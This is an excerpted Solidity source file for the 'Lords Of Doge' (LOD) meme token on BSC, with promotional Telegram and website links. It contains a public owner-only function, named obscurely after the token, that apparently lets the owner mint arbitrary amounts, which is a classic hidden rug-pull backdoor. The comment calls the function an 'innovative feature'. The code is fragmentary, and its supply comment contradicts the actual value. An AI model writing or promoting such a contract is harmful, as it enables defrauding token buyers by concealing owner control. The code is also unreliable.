...
//
// $LordsOfDoge proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/LordsOfDogeBSC
// 📱 Website :: http://lordsofdoge.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _LordsOfDoge(uint256 amount) public onlyOwner {
 _LordsOfDoge(msg.sender, amount);
    }
    ...
    function _LordsOfDoge(address account, uint256 amount) internal virtual {
...
contract $LordsOfDoge is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Lords Of Doge", "LOD") {
     _LordsOfDoge(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}